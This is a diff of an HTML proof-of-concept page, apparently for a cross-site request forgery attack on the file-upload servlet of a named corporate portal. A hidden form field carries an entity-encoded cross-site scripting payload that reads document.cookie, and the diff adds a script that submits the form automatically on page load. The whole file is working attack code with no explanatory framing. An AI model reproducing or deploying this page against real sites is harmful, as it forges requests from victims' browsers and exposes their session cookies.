@@ -1,9 +1,11 @@
 <html>
   <body>
-  <script>history.pushState('', '', '/')</script>
     <form action="https://portal.fpt-software.com/plugins/servlet/fileupload" method="POST">
       <input type="hidden" name="&#95;csrf" value="&lt;svg&#32;onload&#61;&quot;&#96;&#36;&#123;prompt&#40;document&#46;cookie&#41;&#125;&#96;&quot;&gt;" />
       <input type="submit" value="Submit request" />
     </form>
+    <script>
+      document.forms[0].submit();
+    </script>
   </body>
 </html>
